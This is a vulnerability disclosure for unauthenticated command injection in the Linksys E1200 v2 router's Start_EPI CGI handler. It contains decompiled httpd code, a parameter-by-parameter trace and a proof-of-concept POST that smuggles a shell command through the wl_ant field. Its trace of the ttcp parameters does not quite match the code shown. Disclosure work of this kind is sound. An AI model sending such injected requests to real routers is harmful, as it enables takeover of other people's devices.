# Command Injection Vulnerability in `Start_EPI`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | Linksys E1200 v2 Router                                      |
| Firmware Version     | **E1200_v2.0.11.001_us.tar.gz**                              |
| Vulnerability Type   | **Unauthenticated Command Injection**                        |
| Vulnerable Component | `httpd` (function `Start_EPI` → `mysystem_wl` → `wl_exec_cmd`) |
| Prerequisites        | No authentication required; remote exploitation possible via CGI parameters (`wl_ant`, `wl_ssid`, `wl_rate`, `ttcp_num`, `ttcp_ip`, `ttcp_size`) |

2. Exploitation Path

```c
int __fastcall Start_EPI(const char *a1, const char *a2)
{
  ...
  if ( !strcmp(a2, "1") )
  {
    cgi = (const char *)get_cgi((int)"wl_ant");
    v5 = (const char *)get_cgi((int)"wl_ssid");
    v6 = (const char *)get_cgi((int)"wl_rate");
    v7 = (const char *)get_cgi((int)"ttcp_num");
    if ( !v7 )
      v7 = "3000";
    v8 = (const char *)get_cgi((int)"ttcp_ip");
    v9 = (const char *)get_cgi((int)"ttcp_size");
    if ( !v9 )
      v9 = "1472";
    if ( v5 )
    {
      sprintf(v11, "wl %s join %s", v10, v5);
      mysystem_wl(v11);
      sleep(1u);
    }
    if ( cgi )
    {
      sprintf(v11, "wl %s antdiv %s", v10, cgi);
      mysystem_wl(v11);
      sprintf(v11, "wl %s txant %s", v10, cgi);
      mysystem_wl(v11);
    }
    if ( v6 )
    {
      sprintf(v11, "wl %s rate %s", v10, v6);
      mysystem_wl(v11);
    }
    if ( v8 )
    {
      sprintf(v11, "epi_ttcp -tsufm -l %s -n %s %s &", v9, v7, v8);
      mysystem(v11);
    }
  }
  return 0;
}

int __fastcall mysystem_wl(const char *a1)
{
  FILE *v2; // $v0
  FILE *v3; // $s0

  v2 = fopen("/dev/console", "w");
  v3 = v2;
  if ( v2 )
  {
    fprintf(v2, "cmd: [%s]\n", a1);
    fclose(v3);
  }
  return wl_exec_cmd(a1);
}
```

3. **Vulnerable Binaries:** `httpd`.
4. 0-Day Command Injection Exploitation Path:
   - In the `httpd` file, at line 6, `cgi = (const char *)get_cgi((int)"wl_ant")` receives data via `get_cgi`. Only XSS protection is applied, without filtering command-sensitive characters. At line 24, `sprintf(v11, "wl %s antdiv %s", v10, cgi)` concatenates the string, which is then passed directly to line 25, `mysystem_wl(v11)`, and ultimately reaches line 55, `wl_exec_cmd(a1)`, resulting in a command injection vulnerability.
   - In the `httpd` file, at line 6, `cgi = (const char *)get_cgi((int)"wl_ant")` receives data via `get_cgi`. Only XSS protection is applied, without filtering command-sensitive characters. At line 26, `sprintf(v11, "wl %s txant %s", v10, cgi)` concatenates the string, which is then passed directly to line 27, `mysystem_wl(v11)`, and ultimately reaches line 55, `wl_exec_cmd(a1)`, resulting in a command injection vulnerability.
   - In the `httpd` file, at line 7, `v5 = (const char *)get_cgi((int)"wl_ssid")` receives data via `get_cgi`. Only XSS protection is applied, without filtering command-sensitive characters. At line 18, `sprintf(v11, "wl %s join %s", v10, v5)` concatenates the string, which is then passed directly to line 19, `mysystem_wl(v11)`, and ultimately reaches line 55, `wl_exec_cmd(a1)`, resulting in a command injection vulnerability.
   - In the `httpd` file, at line 8, `v6 = (const char *)get_cgi((int)"wl_rate")` receives data via `get_cgi`. Only XSS protection is applied, without filtering command-sensitive characters. At line 31, `sprintf(v11, "wl %s rate %s", v10, v6)` concatenates the string, which is then passed directly to line 32, `mysystem_wl(v11)`, and ultimately reaches line 55, `wl_exec_cmd(a1)`, resulting in a command injection vulnerability.
   - In the `httpd` file, at line 9, `v7 = (const char *)get_cgi((int)"ttcp_num")` receives data via `get_cgi`. Only XSS protection is applied, without filtering command-sensitive characters. At line 36, `sprintf(v11, "epi_ttcp -tsufm -l %s -n %s %s &", v9, v7, v8)` concatenates the string, which is then passed directly to line 37, `mysystem_wl(v11)`, and ultimately reaches line 55, `wl_exec_cmd(a1)`, resulting in a command injection vulnerability.
   - In the `httpd` file, at line 12, `v8 = (const char *)get_cgi((int)"ttcp_ip")` receives data via `get_cgi`. Only XSS protection is applied, without filtering command-sensitive characters. At line 36, `sprintf(v11, "epi_ttcp -tsufm -l %s -n %s %s &", v9, v7, v8)` concatenates the string, which is then passed directly to line 37, `mysystem_wl(v11)`, and ultimately reaches line 55, `wl_exec_cmd(a1)`, resulting in a command injection vulnerability.
   - In the `httpd` file, at line 13, `v9 = (const char *)get_cgi((int)"ttcp_size")` receives data via `get_cgi`. Only XSS protection is applied, without filtering command-sensitive characters. At line 36, `sprintf(v11, "epi_ttcp -tsufm -l %s -n %s %s &", v9, v7, v8)` concatenates the string, which is then passed directly to line 37, `mysystem_wl(v11)`, and ultimately reaches line 55, `wl_exec_cmd(a1)`, resulting in a command injection vulnerability.
5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/Start_EPI HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 123

wl_ant=0;touch+/tmp/pwned;&wl_ssid=EvilSSID&wl_rate=54&ttcp_num=3000&ttcp_ip=192.168.1.100&ttcp_size=1472&a2=1
```